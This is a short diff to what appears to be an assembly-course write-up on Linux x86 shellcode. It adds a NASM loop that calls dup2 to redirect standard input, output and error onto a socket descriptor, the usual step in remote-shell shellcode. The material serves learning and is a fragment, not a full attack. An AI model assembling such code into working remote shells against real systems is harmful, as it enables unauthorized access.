@@ -513,6 +513,21 @@ osboxes@osboxes:~/Downloads/SLAE$ cat /usr/include/i386-linux-gnu/asm/unistd_32.
 #define __NR_dup2 63
 ```
 
+... code 
+
+```nasm
+	mov cl, 0x3     ; putting 3 in the counter
+    
+    	loop_dup2:      
+ 	xor eax, eax   
+   	mov al, 0x3f    ; putting the syscall code into the lower part of eax
+   	mov ebx, edi    ; putting our new int sockfd into ebx
+   	dec cl          ; decrementing cl by one
+   	int 0x80
+    
+    	jnz loop_dup2   ; jumping back to the top of loop_dup2 if the zero flag is not set
+```
+
 #### Assembly Code
 -------------
 
